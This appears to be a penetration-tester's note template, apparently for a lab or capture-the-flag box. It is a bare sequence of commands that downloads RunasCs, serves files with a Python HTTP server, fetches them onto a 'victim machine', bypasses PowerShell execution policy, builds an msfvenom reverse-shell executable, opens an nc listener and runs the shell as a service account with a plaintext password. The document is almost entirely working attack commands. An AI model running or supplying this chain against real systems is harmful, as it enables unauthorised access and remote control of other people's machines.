
1- downlaod invoke runas script
```powershell
wget https://raw.githubusercontent.com/antonioCoco/RunasCs/refs/heads/master/Invoke-RunasCs.ps1
```
start python script 
```powershell
python3 -m http.server 80
```


then download it on the victim machine
```powershell
powershell -c "Invoke-WebRequest -Uri 'http://<% tp.frontmatter["RHOSTS"] %>/Invoke-RunasCs.ps1' -OutFile 'C:\Users\<% tp.frontmatter["domain-username"] %>\Invoke-RunasCs.ps1'"
```
run it 
```powershell
powershell -ep bypass
Import-Module C:\Users\<% tp.frontmatter["domain-username"] %>\Invoke-RunasCs.ps1
```

create a reverse shell 
```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter["RHOSTS"] %> LPORT=445 -f exe -o reverse.exe
```

start python script 
```powershell
python3 -m http.server 80
```

upload it to victim machine 
```powershell
powershell -c "Invoke-WebRequest -Uri 'http://<% tp.frontmatter["RHOSTS"] %>/reverse.exe' -OutFile 'C:\Users\<% tp.frontmatter["domain-username"] %>\reverse.exe'"
```
let's test it 
```powershell
Invoke-RunasCs -Username svc_mssql -Password Service1 -Command "whoami" 
```
start a listener 
```powershell
rlwrap -cAr nc -lvnp 445
```
run the reverse shell 

```powershell
Invoke-RunasCs -Username svc_mssql -Password Service1 -Command "C:\Users\<% tp.frontmatter["domain-username"] %>\reverse.exe"
```

